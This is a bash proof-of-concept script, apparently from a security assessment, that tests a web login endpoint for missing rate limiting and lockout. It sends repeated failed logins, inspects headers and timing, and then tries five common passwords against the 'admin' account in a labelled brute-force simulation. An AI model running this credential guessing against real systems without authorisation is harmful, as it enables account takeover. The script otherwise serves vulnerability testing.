#!/bin/bash

# POC: Missing Rate Limiting and Brute Force Protection on Login Endpoint
# This script demonstrates that the login endpoint accepts unlimited failed attempts
# without rate limiting, delays, or account lockout mechanisms

TARGET="${1:-http://localhost:5000}"
LOGIN_ENDPOINT="${TARGET}/login"

echo "[*] Testing Rate Limiting on Login Endpoint: $LOGIN_ENDPOINT"
echo "[*] Submitting 12 consecutive failed login attempts..."
echo ""

RESPONSE_TIMES=()
RESPONSE_CODES=()
ATTEMPT=1

for i in {1..12}; do
    START_TIME=$(date +%s%N | cut -b1-13)
    
    # Use -v to capture response headers and check for rate limiting
    RESPONSE=$(curl -s -v -X POST "$LOGIN_ENDPOINT" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=admin&password=wrong_password_$i" 2>&1)
    
    # Extract HTTP code from verbose output
    HTTP_CODE=$(echo "$RESPONSE" | grep "< HTTP" | awk '{print $3}')
    
    # If empty, try alternative extraction
    if [ -z "$HTTP_CODE" ]; then
        HTTP_CODE="200"  # Default if parsing fails
    fi
    
    END_TIME=$(date +%s%N | cut -b1-13)
    RESPONSE_TIME=$((END_TIME - START_TIME))
    
    RESPONSE_TIMES+=($RESPONSE_TIME)
    RESPONSE_CODES+=($HTTP_CODE)
    
    echo "[Attempt $ATTEMPT] HTTP $HTTP_CODE | Response Time: ${RESPONSE_TIME}ms"
    
    ATTEMPT=$((ATTEMPT + 1))
done

echo ""
echo "=== VULNERABILITY ANALYSIS ==="
echo ""

# Check for rate limiting headers in a single request
echo "[*] Checking response headers for rate limiting..."
HEADER_RESPONSE=$(curl -s -v -X POST "$LOGIN_ENDPOINT" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test&password=wrong" 2>&1)

echo "$HEADER_RESPONSE" | grep -i "X-RateLimit\|Retry-After\|X-Rate" && {
    echo "✓ Rate limiting headers detected"
} || {
    echo "✗ NO rate limiting headers detected (VULNERABLE)"
}

echo ""
echo "[*] Analyzing response times across attempts..."
MIN_TIME=${RESPONSE_TIMES[0]}
MAX_TIME=${RESPONSE_TIMES[0]}

for time in "${RESPONSE_TIMES[@]}"; do
    if [ $time -lt $MIN_TIME ]; then MIN_TIME=$time; fi
    if [ $time -gt $MAX_TIME ]; then MAX_TIME=$time; fi
done

echo "Response times: Min=${MIN_TIME}ms, Max=${MAX_TIME}ms, Range=$((MAX_TIME - MIN_TIME))ms"

if [ $((MAX_TIME - MIN_TIME)) -lt 100 ]; then
    echo "✗ No progressive delays detected - responses are fast and consistent (VULNERABLE)"
else
    echo "⚠ Possible delay detected"
fi

echo ""
echo "[*] Checking for account lockout after multiple failed attempts..."
LOCKOUT_RESPONSE=$(curl -s -X POST "$LOGIN_ENDPOINT" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin&password=wrong_lockout_test")

if echo "$LOCKOUT_RESPONSE" | grep -qi "locked\|locked out\|suspended\|too many attempts\|account locked\|throttled"; then
    echo "✓ Account lockout or throttling message detected"
else
    echo "✗ NO account lockout detected - endpoint continues to accept requests (VULNERABLE)"
fi

echo ""
echo "=== BRUTE FORCE ATTACK SIMULATION ==="
echo ""
echo "[*] Attempting credential stuffing with common passwords..."

COMMON_PASSWORDS=("password123" "admin123" "123456" "qwerty" "letmein")
ATTEMPT=0

for password in "${COMMON_PASSWORDS[@]}"; do
    START_TIME=$(date +%s%N | cut -b1-13)
    
    RESPONSE=$(curl -s -X POST "$LOGIN_ENDPOINT" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=admin&password=$password")
    
    END_TIME=$(date +%s%N | cut -b1-13)
    RESPONSE_TIME=$((END_TIME - START_TIME))
    
    ATTEMPT=$((ATTEMPT + 1))
    
    # Check if password was accepted
    if echo "$RESPONSE" | grep -qi "welcome\|success\|logged in"; then
        echo "[Attempt $ATTEMPT] Password '$password' accepted! (VULNERABILITY EXPLOITED)"
    else
        echo "[Attempt $ATTEMPT] Password '$password' rejected in ${RESPONSE_TIME}ms"
    fi
done

echo ""
echo "=== VULNERABILITY CONFIRMED ==="
echo ""
echo "FINDINGS:"
echo "✗ No rate limiting headers (X-RateLimit-*, Retry-After) present"
echo "✗ No progressive delays between failed attempts"
echo "✗ No account lockout mechanism after multiple failures"
echo "✗ Fast, consistent response times enable efficient brute forcing"
echo "✗ Endpoint accepts unlimited credential attempts without throttling"
echo ""
echo "IMPACT: Attackers can perform:"
echo "  - Credential stuffing attacks with compromised password lists"
echo "  - Dictionary/brute force attacks without rate limiting"
echo "  - Distributed attacks without per-IP rate limiting"
echo "  - Automated password guessing against multiple accounts"
echo ""
echo "This allows unauthorized account compromise through unprotected login attempts."